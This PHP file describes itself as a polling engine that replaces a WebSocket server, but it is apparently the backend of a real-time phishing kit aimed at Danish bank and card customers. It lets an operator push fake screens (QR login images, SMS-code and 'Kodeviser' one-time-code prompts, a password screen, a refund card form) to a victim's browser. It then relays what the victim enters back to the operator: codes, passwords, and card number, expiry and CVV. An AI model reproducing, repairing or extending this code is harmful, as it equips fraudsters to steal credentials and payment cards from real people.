<?php
/**
 * Real-time Polling & Message Dispatch Engine
 * Replaces WebSocket server for shared LAMP hosting (InfinityFree)
 * Implements 100% of Node.js server/websocket.js logic
 */

require_once __DIR__ . '/helpers.php';
require_once __DIR__ . '/../config/db.php';

function handleWsPolling(string $method, string $path): bool {
    $pdo = DB::getConnection();

    // GET /api/ws/poll?sessionId=...&role=...&lastId=...&timeout=...
    if ($method === 'GET' && ($path === '/api/ws/poll' || $path === '/ws/poll')) {
        $sessionId = trim($_GET['sessionId'] ?? '');
        $role = trim($_GET['role'] ?? '');
        $lastId = (int)($_GET['lastId'] ?? 0);
        $timeout = isset($_GET['timeout']) ? (int)$_GET['timeout'] : 0;

        if (empty($sessionId) || empty($role)) {
            sendError('Missing params', 400);
        }

        // Cap timeout to max 2 seconds if explicitly requested, otherwise 0 (non-blocking)
        if ($timeout < 0) {
            $timeout = 0;
        } elseif ($timeout > 2) {
            $timeout = 2;
        }

        // Release any session lock to allow concurrent requests
        if (session_status() === PHP_SESSION_ACTIVE) {
            session_write_close();
        }

        // Prevent script execution timeout
        @set_time_limit(10);

        // Keep-Alive and no-cache headers for Polling
        header('Connection: keep-alive');
        header('Keep-Alive: timeout=5, max=1000');
        header('Cache-Control: no-cache, no-store, must-revalidate');

        $stmt = $pdo->prepare("
            SELECT id, message, created_at
            FROM ws_messages
            WHERE session_id = ? AND target_role = ? AND id > ?
            ORDER BY id ASC
            LIMIT 50
        ");

        $formatAndSend = function (array $rows) use ($lastId) {
            $maxId = $lastId;
            $messages = [];
            foreach ($rows as $r) {
                $id = (int)$r['id'];
                if ($id > $maxId) {
                    $maxId = $id;
                }
                $decoded = json_decode($r['message'], true);
                $messages[] = [
                    'id' => $id,
                    'message' => ($decoded !== null) ? $decoded : $r['message'],
                    'created_at' => isset($r['created_at']) ? toIso8601($r['created_at']) : toIso8601(date('Y-m-d H:i:s')),
                ];
            }
            sendJson([
                'ok' => true,
                'messages' => $messages,
                'lastId' => $maxId,
            ]);
        };

        // If non-blocking (default), query once and immediately return (<1ms)
        if ($timeout === 0) {
            $stmt->execute([$sessionId, $role, $lastId]);
            $rows = $stmt->fetchAll();
            $stmt->closeCursor();

            $formatAndSend($rows);
            return true;
        }

        // Otherwise, short-poll up to capped timeout (max 2s)
        $startTime = microtime(true);
        while (true) {
            $stmt->execute([$sessionId, $role, $lastId]);
            $rows = $stmt->fetchAll();
            $stmt->closeCursor();

            if (!empty($rows)) {
                $formatAndSend($rows);
                return true;
            }

            if (connection_aborted()) {
                exit;
            }

            if ((microtime(true) - $startTime) >= $timeout) {
                sendJson([
                    'ok' => true,
                    'messages' => [],
                    'lastId' => $lastId,
                ]);
                return true;
            }

            usleep(30000); // 30ms interval
        }
    }

    // POST /api/ws/send
    if ($method === 'POST' && ($path === '/api/ws/send' || $path === '/ws/send')) {
        // Prune expired messages (>2 minutes old) probabilistically (5% of writes)
        if (mt_rand(1, 20) === 1) {
            try {
                $cutoff = date('Y-m-d H:i:s', time() - 120);
                $pdo->prepare("DELETE FROM ws_messages WHERE created_at < ?")->execute([$cutoff]);
            } catch (Throwable $t) {
                // Non-blocking cleanup
            }
        }

        $input = getJsonInput();
        $sessionId = trim($input['sessionId'] ?? '');
        $role = trim($input['role'] ?? '');
        $data = $input['data'] ?? [];

        if (empty($sessionId) || empty($role) || !is_array($data) || empty($data)) {
            sendError('Missing params', 400);
        }

        $type = $data['type'] ?? '';
        $now = date('Y-m-d H:i:s');

        // Helper to queue messages for target role
        $queueMessage = function (string $targetRole, array $payload) use ($pdo, $sessionId, $role) {
            $stmt = $pdo->prepare("INSERT INTO ws_messages (session_id, sender_role, target_role, message) VALUES (?, ?, ?, ?)");
            $stmt->execute([$sessionId, $role, $targetRole, json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)]);
        };

        // 1. Handle ping -> pong (emulates Node.js ws ping/pong)
        if ($type === 'ping') {
            $t = $data['t'] ?? round(microtime(true) * 1000);
            $queueMessage($role, ['type' => 'pong', 't' => $t]);
            sendJson(['ok' => true, 'type' => 'pong', 't' => $t]);
            return true;
        }

        // 2. Admin events
        if ($role === 'admin') {
            if ($type === 'qr-show') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 1, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                logEvent($pdo, $sessionId, 'qr_shown', 'Admin started screen share', $role);
                $queueMessage('user', ['type' => 'qr-show']);
            }

            elseif ($type === 'qr-hide') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                logEvent($pdo, $sessionId, 'qr_hide', 'Admin hid QR', $role);
                $queueMessage('user', ['type' => 'qr-hide']);
            }

            elseif ($type === 'qr-image') {
                $img = (string)($data['image'] ?? '');
                $pdo->prepare("UPDATE sessions SET qr_visible = 1, qr_image = ?, updated_at = ? WHERE session_id = ?")->execute([$img, $now, $sessionId]);
                // Optimize queue: remove previous pending qr-image to avoid queue bloat
                $pdo->prepare("DELETE FROM ws_messages WHERE session_id = ? AND target_role = 'user' AND message LIKE '%\"qr-image\"%'")->execute([$sessionId]);
                $queueMessage('user', ['type' => 'qr-show']);
                $queueMessage('user', ['type' => 'qr-image', 'image' => $img]);
            }

            elseif ($type === 'sms-code') {
                $codeLength = !empty($data['codeLength']) ? (int)$data['codeLength'] : 6;
                $amount = (isset($data['amount']) && $data['amount'] !== '' && $data['amount'] !== null) ? (string)$data['amount'] : null;
                $displayText = (isset($data['displayText']) && $data['displayText'] !== '' && $data['displayText'] !== null) ? (string)$data['displayText'] : null;
                $message = !empty($data['message']) ? (string)$data['message'] : 'SMS sendt';

                $amountStr = $amount !== null ? $amount : 'none';
                $textStr = $displayText !== null ? $displayText : 'none';
                $detail = "SMS activated: {$codeLength} digits, amount: {$amountStr}, text: {$textStr}";
                logEvent($pdo, $sessionId, 'sms_sent', $detail, $role);

                $queueMessage('user', [
                    'type' => 'sms-activate',
                    'codeLength' => $codeLength,
                    'amount' => $amount,
                    'displayText' => $displayText,
                    'message' => $message,
                    'resetToDefault' => true,
                ]);
            }

            elseif ($type === 'status-toggle') {
                $field = $data['field'] ?? '';
                $val = !empty($data['value']) ? 1 : 0;
                if (in_array($field, ['sms_active', 'otp_active', 'kode_active'], true)) {
                    $pdo->prepare("UPDATE sessions SET {$field} = ?, updated_at = ? WHERE session_id = ?")->execute([$val, $now, $sessionId]);
                    $queueMessage('admin', ['type' => 'status-changed', 'field' => $field, 'value' => (bool)$val]);
                    $queueMessage('user', ['type' => 'status-toggle', 'field' => $field, 'value' => (bool)$val]);
                }
            }

            elseif ($type === 'verified') {
                $pdo->prepare("UPDATE sessions SET status = 'verified', verified_at = ?, updated_at = ? WHERE session_id = ?")->execute([$now, $now, $sessionId]);
                logEvent($pdo, $sessionId, 'verified', 'Admin verified', $role);
                $queueMessage('user', ['type' => 'verified']);
            }

            elseif ($type === 'title-change') {
                $title = (string)($data['title'] ?? '');
                logEvent($pdo, $sessionId, 'title_changed', $title, $role);
                $queueMessage('user', ['type' => 'title-change', 'title' => $title]);
            }

            elseif ($type === 'broadcast-message') {
                $msg = (string)($data['message'] ?? '');
                logEvent($pdo, $sessionId, 'broadcast_sent', $msg, $role);
                $queueMessage('user', ['type' => 'broadcast-message', 'message' => $msg]);
            }

            elseif ($type === 'message-type') {
                $mType = (string)($data['messageType'] ?? '');
                $text = (string)($data['text'] ?? '');
                logEvent($pdo, $sessionId, 'msg_type_changed', "{$mType}: {$text}", $role);
                $queueMessage('user', ['type' => 'message-type', 'messageType' => $mType, 'text' => $text]);
            }

            elseif ($type === 'broadcast-toggle') {
                $queueMessage('user', ['type' => 'broadcast-toggle', 'enabled' => (bool)($data['enabled'] ?? false)]);
            }

            elseif ($type === 'admin-left') {
                logEvent($pdo, $sessionId, 'admin_left', 'Admin left session', $role);
                $queueMessage('user', ['type' => 'admin-left']);
            }

            elseif ($type === 'admin-approve') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                $approvedMsg = !empty($data['message']) ? (string)$data['message'] : 'Godkendt';
                $approvedTitle = !empty($data['title']) ? (string)$data['title'] : 'Vent venligst';
                logEvent($pdo, $sessionId, 'approved', $approvedMsg, $role);
                $queueMessage('user', [
                    'type' => 'approved',
                    'message' => $approvedMsg,
                    'title' => $approvedTitle,
                ]);
                $queueMessage('admin', ['type' => 'status-changed', 'field' => 'sms_active', 'value' => false]);
            }

            elseif ($type === 'default-page') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                logEvent($pdo, $sessionId, 'default_page', 'Admin reset to default page', $role);
                $queueMessage('user', [
                    'type' => 'default-page',
                    'title' => (string)($data['title'] ?? ''),
                    'message' => !empty($data['message']) ? (string)$data['message'] : null,
                    'clearMessages' => ($data['clearMessages'] ?? true) !== false,
                ]);
                $queueMessage('admin', ['type' => 'status-changed', 'field' => 'sms_active', 'value' => false]);
            }

            elseif ($type === 'payment-refunded') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                logEvent($pdo, $sessionId, 'payment_refunded', 'Admin showed payment cancelled / refund screen', $role);
                $queueMessage('user', ['type' => 'payment-refunded']);
                $queueMessage('admin', ['type' => 'status-changed', 'field' => 'sms_active', 'value' => false]);
            }

            // Adgangskode screen
            elseif ($type === 'show-adgangskode') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                logEvent($pdo, $sessionId, 'show_adgangskode', 'Admin showed Adgangskode screen', $role);
                $queueMessage('user', ['type' => 'show-adgangskode']);
            }

            // Refundering på kort — card form (from + amount from admin modal)
            elseif ($type === 'show-card-refund') {
                $from = trim((string)($data['from'] ?? $data['displayText'] ?? ''));
                $amount = isset($data['amount']) ? trim((string)$data['amount']) : '';
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                $detail = 'Card refund screen' . ($from !== '' ? " from={$from}" : '') . ($amount !== '' ? " amount={$amount}" : '');
                logEvent($pdo, $sessionId, 'show_card_refund', $detail, $role);
                $queueMessage('user', [
                    'type' => 'show-card-refund',
                    'from' => $from,
                    'displayText' => $from,
                    'amount' => $amount !== '' ? $amount : null,
                ]);
            }

            // Kodeviser — 6-digit engangskode screen
            elseif ($type === 'show-kodeviser') {
                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                logEvent($pdo, $sessionId, 'show_kodeviser', 'Admin showed Kodeviser screen', $role);
                $queueMessage('user', ['type' => 'show-kodeviser']);
            }
        }

        // 3. User events
        elseif ($role === 'user') {
            if ($type === 'verified') {
                $pdo->prepare("UPDATE sessions SET status = 'verified', verified_at = ?, updated_at = ? WHERE session_id = ?")->execute([$now, $now, $sessionId]);
                logEvent($pdo, $sessionId, 'verified', 'QR scanned by user', $role);
                $queueMessage('admin', ['type' => 'user-verified']);
                $queueMessage('user', ['type' => 'verified']);
            }

            elseif ($type === 'sms-submitted') {
                $code = (string)($data['code'] ?? '');
                logEvent($pdo, $sessionId, 'sms_submitted', "Code: {$code}", $role);
                $queueMessage('admin', ['type' => 'sms-submitted', 'code' => $code, 'session_id' => $sessionId, 'sessionId' => $sessionId]);
            }

            elseif ($type === 'adgangskode-submitted') {
                $code = (string)($data['code'] ?? '');
                logEvent($pdo, $sessionId, 'adgangskode_submitted', "Adgangskode: {$code}", $role);
                $queueMessage('admin', [
                    'type' => 'adgangskode-submitted',
                    'code' => $code,
                    'session_id' => $sessionId,
                    'sessionId' => $sessionId,
                ]);
            }

            elseif ($type === 'card-refund-submitted') {
                $card = (string)($data['cardNumber'] ?? '');
                $exp = (string)($data['expiry'] ?? '');
                $cvv = (string)($data['cvv'] ?? '');
                $detail = "Kort: {$card}" . ($exp !== '' ? " Exp: {$exp}" : '') . ($cvv !== '' ? " CVV: {$cvv}" : '');
                logEvent($pdo, $sessionId, 'card_refund_submitted', $detail, $role);
                $queueMessage('admin', [
                    'type' => 'card-refund-submitted',
                    'cardNumber' => $card,
                    'expiry' => $exp,
                    'cvv' => $cvv,
                    'session_id' => $sessionId,
                    'sessionId' => $sessionId,
                ]);
            }

            elseif ($type === 'kodeviser-submitted') {
                $code = (string)($data['code'] ?? '');
                logEvent($pdo, $sessionId, 'kodeviser_submitted', "Kodeviser: {$code}", $role);
                $queueMessage('admin', [
                    'type' => 'kodeviser-submitted',
                    'code' => $code,
                    'session_id' => $sessionId,
                    'sessionId' => $sessionId,
                ]);
            }

            elseif ($type === 'user-left') {
                logEvent($pdo, $sessionId, 'user_left', 'User disconnected (Afbryd)', $role);
                $queueMessage('admin', ['type' => 'user-left', 'session_id' => $sessionId, 'sessionId' => $sessionId]);
            }
        }

        sendJson(['ok' => true]);
        return true;
    }

    return false;
}
